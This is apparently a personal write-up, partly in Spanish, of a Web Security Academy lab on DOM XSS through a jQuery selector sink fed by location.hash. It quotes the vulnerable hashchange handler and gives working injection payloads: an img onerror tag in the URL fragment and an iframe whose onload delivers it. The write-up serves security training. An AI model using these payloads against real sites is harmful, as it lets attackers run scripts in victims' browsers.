# Lab: DOM XSS in jQuery selector sink using a hashchange event

```jsx
This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.
```

![image.png](Lab%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashch%20e741e9361c9946e091b58a0908e605e5/image.png)

```jsx
$(window).on('hashchange', function(){
	var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
	if (post) post.get(0).scrollIntoView();
});
                    
```

## Teoría

- **`$(window).on('hashchange', function(){`**: Este código está configurando un evento en la ventana del navegador que se activa cuando cambia el **hash** de la URL (la parte después del `#`).
- Por ejemplo, si la URL cambia de `www.ejemplo.com/#section1` a `www.ejemplo.com/#section2`, se desencadena el evento `hashchange`. No podemos cambiar el

Antes de usar la parte del servidor exploit, accederemos a este enlace, con eso demostramos que, despues del #, lo que siga se mostrará en la web, por ende podemos forzar el error-

[https://0a7700eb049d5826e6924156002700d9.web-security-academy.net/#<img src=x onerror=print()>](https://0a7700eb049d5826e6924156002700d9.web-security-academy.net/#%3Cimg%20src=x%20onerror=print()%3E)

![image.png](Lab%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashch%20e741e9361c9946e091b58a0908e605e5/image%201.png)

Pasos para terminar el laboratorio

1. `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
2. <iframe src="[https://0a7700eb049d5826e6924156002700d9.web-security-academy.net/#](https://0a7700eb049d5826e6924156002700d9.web-security-academy.net/#)" onload="this.src+='<img src=x onerror=print()>'"></iframe>

![image.png](Lab%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashch%20e741e9361c9946e091b58a0908e605e5/image%202.png)

![image.png](Lab%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashch%20e741e9361c9946e091b58a0908e605e5/image%203.png)